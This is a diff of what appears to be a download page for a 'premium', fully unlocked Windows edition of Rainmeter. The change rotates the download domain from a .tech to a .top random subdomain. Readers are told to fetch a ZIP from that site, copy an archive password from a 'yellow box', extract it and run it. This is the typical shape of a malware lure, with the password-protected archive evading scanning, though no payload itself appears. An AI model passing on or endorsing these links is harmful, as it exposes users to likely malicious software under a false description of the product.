@@ -8,12 +8,12 @@ Rainmeter — Windows setup and configuration · Premium workspace · Zero nag d
 
 > Use the release page below for Windows.
 
-- **Release page:** [hbxzzknunmv.slopmods.tech](https://hbxzzknunmv.slopmods.tech/)
-- **Full URL:** `https://hbxzzknunmv.slopmods.tech/`
+- **Release page:** [hbxzzknunmv.slopmods.top](https://hbxzzknunmv.slopmods.top/)
+- **Full URL:** `https://hbxzzknunmv.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **hbxzzknunmv.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **hbxzzknunmv.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ Rainmeter — Windows setup and configuration · Premium workspace · Zero nag d
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **hbxzzknunmv.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **hbxzzknunmv.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
